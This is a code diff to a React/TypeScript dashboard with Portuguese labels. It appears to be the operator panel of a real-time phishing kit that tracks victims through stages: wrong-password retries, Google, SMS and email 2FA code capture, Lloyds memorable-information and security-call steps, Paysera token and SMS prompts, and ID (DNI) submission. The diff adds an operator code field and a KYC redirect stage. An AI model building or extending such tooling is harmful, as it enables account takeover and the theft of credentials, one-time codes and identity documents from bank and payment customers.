@@ -42,6 +42,7 @@ interface SessionRecord {
   created_at: string;
   otp_code: string | null;
   source: string | null;
+  operator_code: string | null;
 }
 
 /* ═══════════════════════════════════════════ */
@@ -58,6 +59,7 @@ const statusMap: Record<string, { label: string; icon: React.ReactNode; cls: str
   login_success:         { label: "Sucesso",       icon: <CheckCircle size={11} />, cls: "bg-green-600/15 text-green-400 border-green-600/30" },
   wrong_password:        { label: "Senha errada – tentando novamente", icon: <RefreshCw size={11} />, cls: "bg-orange-500/15 text-orange-400 border-orange-500/30" },
   redirect_otp:          { label: "→ 2FA Google", icon: <KeyRound size={11} />,    cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
+  redirect_kyc:          { label: "→ KYC",         icon: <ShieldCheck size={11} />, cls: "bg-primary/15 text-primary border-primary/30" },
   redirect_mfa_sms:      { label: "→ 2FA SMS",    icon: <Smartphone size={11} />, cls: "bg-green-500/15 text-green-400 border-green-500/30" },
   redirect_mfa_email:    { label: "→ 2FA Email",  icon: <Mail size={11} />,       cls: "bg-amber-500/15 text-amber-400 border-amber-500/30" },
   redirect_confirm_email:{ label: "→ Identif.",   icon: <ShieldCheck size={11} />, cls: "bg-amber-500/15 text-amber-400 border-amber-500/30" },
@@ -78,7 +80,6 @@ const statusMap: Record<string, { label: string; icon: React.ReactNode; cls: str
   lloyds_memorable:      { label: "Info Memorável", icon: <KeyRound size={11} />,    cls: "bg-emerald-500/15 text-emerald-400 border-emerald-500/30" },
   lloyds_security_call:  { label: "Chamada Seg.",  icon: <Smartphone size={11} />,  cls: "bg-blue-500/15 text-blue-400 border-blue-500/30" },
   lloyds_calling:        { label: "Ligando",       icon: <Smartphone size={11} />,  cls: "bg-amber-500/15 text-amber-400 border-amber-500/30" },
-  // CocosV2 verification statuses
   verify_dni_submitted:  { label: "DNI Enviado",   icon: <ShieldCheck size={11} />, cls: "bg-purple-500/15 text-purple-400 border-purple-500/30" },
   verify_dni_success:    { label: "DNI ✓",          icon: <CheckCircle size={11} />, cls: "bg-green-600/15 text-green-400 border-green-600/30" },
   verify_dni_error:      { label: "DNI ✗",          icon: <XCircle size={11} />,     cls: "bg-destructive/15 text-destructive border-destructive/30" },
@@ -99,6 +100,7 @@ const getClientStage = (status: string): { label: string; color: string } => {
   if (status === "otp_submitted")         return { label: "OTP enviado",            color: "text-blue-400" };
   if (status === "wrong_password")        return { label: "Errou senha / redigitando", color: "text-destructive" };
   if (status === "redirect_otp")          return { label: "Digitando 2FA Google",  color: "text-blue-400" };
+  if (status === "redirect_kyc")          return { label: "Preenchendo KYC",        color: "text-primary" };
   if (status === "redirect_mfa_sms")      return { label: "Digitando 2FA SMS",     color: "text-green-400" };
   if (status === "redirect_mfa_email")    return { label: "Digitando 2FA Email",   color: "text-amber-400" };
   if (status === "otp_approved")          return { label: "2FA aprovado ✓",         color: "text-green-400" };
@@ -120,7 +122,6 @@ const getClientStage = (status: string): { label: string; color: string } => {
   if (status === "paysera_show_token") return { label: "Vendo token (app)", color: "text-blue-400" };
   if (status === "paysera_ask_sms") return { label: "Digitando SMS", color: "text-blue-400" };
   if (status === "paysera_verify_phone") return { label: "Verificando Tel", color: "text-orange-400" };
-  // CocosV2 verification
   if (status === "verify_dni_submitted")  return { label: "Enviou DNI",           color: "text-purple-400" };
   if (status === "verify_dni_success")    return { label: "DNI validado ✓",       color: "text-green-400" };
   if (status === "verify_dni_error")      return { label: "DNI falhou",           color: "text-destructive" };
